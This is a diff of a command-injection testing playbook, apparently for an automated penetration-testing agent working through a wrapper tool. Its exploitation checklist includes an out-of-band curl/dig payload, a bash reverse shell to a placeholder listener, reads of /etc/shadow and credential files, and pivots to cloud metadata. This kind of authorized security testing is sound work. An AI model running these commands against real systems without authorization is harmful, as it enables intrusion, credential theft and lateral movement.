@@ -19,10 +19,10 @@ Command injection in 2025 lives in: file conversion endpoints (ImageMagick, FFmp
 
 ## Tools
 
-- `curl` / `wget` (manual requests)
-- Burp Suite Repeater + Intruder
-- Commix (automated command injection — useful for initial sweep, but misses argument injection entirely)
-- Custom wordlists for injection payloads
+- `aith assess kali exec -- curl ...` (deliver injection payloads — all target-facing requests must go through the kali exec wrapper; use `--technique CMDI --probe-kind payload --phase consume-test --timeout 30`, switching to `--probe-kind exploit` once code execution is confirmed)
+- Burp Suite Repeater + Intruder (craft the request — then replay via kali exec for audit pipeline coverage)
+- `aith assess kali exec --technique CMDI --probe-kind payload --phase consume-test --timeout 300 -- commix ...` (automated command injection — useful for initial sweep, but misses argument injection entirely)
+- Custom wordlists for injection payloads (prepare host-side, deliver via kali exec)
 
 ---
 
@@ -213,7 +213,10 @@ $(dig $OOB_URL)
 $(curl http://$OOB_URL/)
 ```
 
-If `$DIR/.oob_url` is available, use the provisioned callback URL. If not, fall back to timing, and request OOB infrastructure from the operator if timing is ambiguous.
+Use `aith oob status --json` to confirm OOB readiness, then use the unique URL
+from `aith oob client logs <name> --lines 80` in payloads and read the same
+client log for correlated hits. If OOB is unavailable, fall back to timing and
+record a runtime issue when OOB would have been decisive.
 
 ### File Creation + Read-Back
 
@@ -264,14 +267,14 @@ Then read the file through the other vulnerability. This provides both confirmat
 
 ## Exploitation
 
-Once injection is confirmed:
+Once injection is confirmed, record the finding only after showing the **attacker outcome** — not just "command injection confirmed":
 
-- [ ] Read sensitive files: `/etc/passwd`, `/etc/shadow`, application config files, `.env`, database credentials
+- [ ] Read sensitive files: `/etc/passwd`, `/etc/shadow`, application config files, `.env`, database credentials — show the actual file contents in the finding evidence
 - [ ] Establish reverse shell (MANUAL listener required — see `references/offensive-tactics/shell-handling.md`):
-      `; bash -i >& /dev/tcp/LISTENER_HOST/LISTENER_PORT 0>&1`
-- [ ] Enumerate internal network: `ifconfig`/`ip addr`, `cat /etc/hosts`, `env` (for cloud metadata URLs, internal service addresses)
-- [ ] Pivot: `curl http://169.254.169.254/latest/meta-data/` (cloud metadata), `curl http://internal-service/`
-- [ ] Container detection: `cat /proc/1/cgroup`, `ls /.dockerenv` — if containerized, the RCE scope may be limited
+      `; bash -i >& /dev/tcp/LISTENER_HOST/LISTENER_PORT 0>&1` — record the shell session output and user context as proof
+- [ ] Enumerate internal network: `ifconfig`/`ip addr`, `cat /etc/hosts`, `env` (for cloud metadata URLs, internal service addresses) — map what internal reach the injection provides
+- [ ] Pivot: `curl http://169.254.169.254/latest/meta-data/` (cloud metadata), `curl http://internal-service/` — show what metadata or internal services are reachable
+- [ ] Container detection: `cat /proc/1/cgroup`, `ls /.dockerenv` — if containerized, the RCE scope may be limited; note the container boundary in the finding
 
 ## Kill Signals — Stop Testing When
 - Application uses execve/spawn (no shell) confirmed by lack of separator-based injection → switch to argument injection section only
